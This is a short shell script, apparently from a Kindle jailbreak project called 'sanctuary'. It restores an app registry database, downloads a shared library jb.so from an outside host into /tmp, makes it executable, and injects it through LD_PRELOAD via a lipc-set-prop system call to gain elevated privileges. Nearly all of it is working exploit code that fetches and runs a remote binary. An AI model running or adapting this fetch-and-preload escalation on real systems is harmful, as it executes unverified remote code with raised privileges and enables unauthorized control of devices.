#!/bin/sh
cp /var/local/appreg.db.bak /var/local/appreg.db
logger "sanctuary: appreg.db restored"
curl -o /tmp/jb.so https://kindlemodding.org/sanctuary/aprivesc/jb.so
chmod +x /tmp/jb.so
lipc-set-prop com.lab126.system updateWaveform LD_PRELOAD=/tmp/jb.so
logger "sanctuary: privesc.sh executed any failure is solely with the privesc now"

